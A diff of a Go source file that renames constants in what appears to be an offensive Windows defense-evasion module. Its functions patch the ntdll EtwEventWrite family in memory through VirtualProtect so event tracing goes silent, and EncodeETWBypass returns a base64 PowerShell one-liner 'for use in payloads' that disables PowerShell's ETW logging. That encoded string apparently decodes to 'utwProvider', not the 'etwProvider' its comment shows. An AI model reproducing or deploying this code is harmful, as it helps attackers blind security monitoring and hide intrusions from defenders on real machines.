@@ -15,16 +15,11 @@ import (
 type ETWPatchMethod int
 
 const (
-	// PatchEtwEventWrite - Patch EtwEventWrite to return immediately
-	PatchEtwEventWrite ETWPatchMethod = iota
-	// PatchEtwEventWriteFull - Patch EtwEventWriteFull
-	PatchEtwEventWriteFull
-	// PatchEtwEventWriteEx - Patch EtwEventWriteEx
-	PatchEtwEventWriteEx
-	// PatchEtwEventWriteTransfer - Patch EtwEventWriteTransfer
-	PatchEtwEventWriteTransfer
-	// PatchEtwEventWriteString - Patch EtwEventWriteString
-	PatchEtwEventWriteString
+	PatchEtwEventWriteMethod ETWPatchMethod = iota
+	PatchEtwEventWriteFullMethod
+	PatchEtwEventWriteExMethod
+	PatchEtwEventWriteTransferMethod
+	PatchEtwEventWriteStringMethod
 )
 
 // ETWBypassResult contains the result of an ETW bypass attempt.
@@ -53,7 +48,7 @@ func PatchEtwEventWrite() *ETWBypassResult {
 
 	var oldProtect uint32
 	if err := virtualProtect(addr, uintptr(len(patch)), 0x40, &oldProtect); err != nil {
-		return &ETWBypassResult{Success: false, Method: PatchEtwEventWrite, Error: err.Error()}
+		return &ETWBypassResult{Success: false, Method: PatchEtwEventWriteMethod, Error: err.Error()}
 	}
 
 	copy((*[4]byte)(unsafe.Pointer(addr))[:], patch)
@@ -61,7 +56,7 @@ func PatchEtwEventWrite() *ETWBypassResult {
 
 	return &ETWBypassResult{
 		Success: true,
-		Method:  PatchEtwEventWrite,
+		Method:  PatchEtwEventWriteMethod,
 		Note:    "EtwEventWrite patched to return ERROR_SUCCESS",
 	}
 }
@@ -78,7 +73,7 @@ func PatchEtwEventWriteFull() *ETWBypassResult {
 
 	var oldProtect uint32
 	if err := virtualProtect(addr, uintptr(len(patch)), 0x40, &oldProtect); err != nil {
-		return &ETWBypassResult{Success: false, Method: PatchEtwEventWriteFull, Error: err.Error()}
+		return &ETWBypassResult{Success: false, Method: PatchEtwEventWriteFullMethod, Error: err.Error()}
 	}
 
 	copy((*[4]byte)(unsafe.Pointer(addr))[:], patch)
@@ -86,7 +81,7 @@ func PatchEtwEventWriteFull() *ETWBypassResult {
 
 	return &ETWBypassResult{
 		Success: true,
-		Method:  PatchEtwEventWriteFull,
+		Method: PatchEtwEventWriteFullMethod,
 		Note:    "EtwEventWriteFull patched",
 	}
 }
@@ -103,7 +98,7 @@ func PatchEtwEventWriteEx() *ETWBypassResult {
 
 	var oldProtect uint32
 	if err := virtualProtect(addr, uintptr(len(patch)), 0x40, &oldProtect); err != nil {
-		return &ETWBypassResult{Success: false, Method: PatchEtwEventWriteEx, Error: err.Error()}
+		return &ETWBypassResult{Success: false, Method: PatchEtwEventWriteExMethod, Error: err.Error()}
 	}
 
 	copy((*[4]byte)(unsafe.Pointer(addr))[:], patch)
@@ -111,7 +106,7 @@ func PatchEtwEventWriteEx() *ETWBypassResult {
 
 	return &ETWBypassResult{
 		Success: true,
-		Method:  PatchEtwEventWriteEx,
+		Method: PatchEtwEventWriteExMethod,
 		Note:    "EtwEventWriteEx patched",
 	}
 }
@@ -128,7 +123,7 @@ func PatchEtwEventWriteTransfer() *ETWBypassResult {
 
 	var oldProtect uint32
 	if err := virtualProtect(addr, uintptr(len(patch)), 0x40, &oldProtect); err != nil {
-		return &ETWBypassResult{Success: false, Method: PatchEtwEventWriteTransfer, Error: err.Error()}
+		return &ETWBypassResult{Success: false, Method: PatchEtwEventWriteTransferMethod, Error: err.Error()}
 	}
 
 	copy((*[4]byte)(unsafe.Pointer(addr))[:], patch)
@@ -136,7 +131,7 @@ func PatchEtwEventWriteTransfer() *ETWBypassResult {
 
 	return &ETWBypassResult{
 		Success: true,
-		Method:  PatchEtwEventWriteTransfer,
+		Method: PatchEtwEventWriteTransferMethod,
 		Note:    "EtwEventWriteTransfer patched",
 	}
 }
@@ -153,7 +148,7 @@ func PatchEtwEventWriteString() *ETWBypassResult {
 
 	var oldProtect uint32
 	if err := virtualProtect(addr, uintptr(len(patch)), 0x40, &oldProtect); err != nil {
-		return &ETWBypassResult{Success: false, Method: PatchEtwEventWriteString, Error: err.Error()}
+		return &ETWBypassResult{Success: false, Method: PatchEtwEventWriteStringMethod, Error: err.Error()}
 	}
 
 	copy((*[4]byte)(unsafe.Pointer(addr))[:], patch)
@@ -161,7 +156,7 @@ func PatchEtwEventWriteString() *ETWBypassResult {
 
 	return &ETWBypassResult{
 		Success: true,
-		Method:  PatchEtwEventWriteString,
+		Method: PatchEtwEventWriteStringMethod,
 		Note:    "EtwEventWriteString patched",
 	}
 }
@@ -274,7 +269,7 @@ func DisableETWProvider(providerGUID string) error {
 // EncodeETWBypass returns an encoded ETW bypass technique for use in payloads.
 func EncodeETWBypass(method ETWPatchMethod) string {
 	switch method {
-	case PatchEtwEventWrite:
+	case PatchEtwEventWriteMethod:
 		// PowerShell: [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null).Disable()
 		return "JFJlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5UcmFjaW5nLlBTRXR3TG9nUHJvdmlkZXInKS5HZXRGaWVsZCgndXR3UHJvdmlkZXInLCdOb25QdWJsaWMsU3RhdGljJykuR2V0VmFsdWUoJG51bGwpLkRpc2FibGUoKQ=="
 	default:
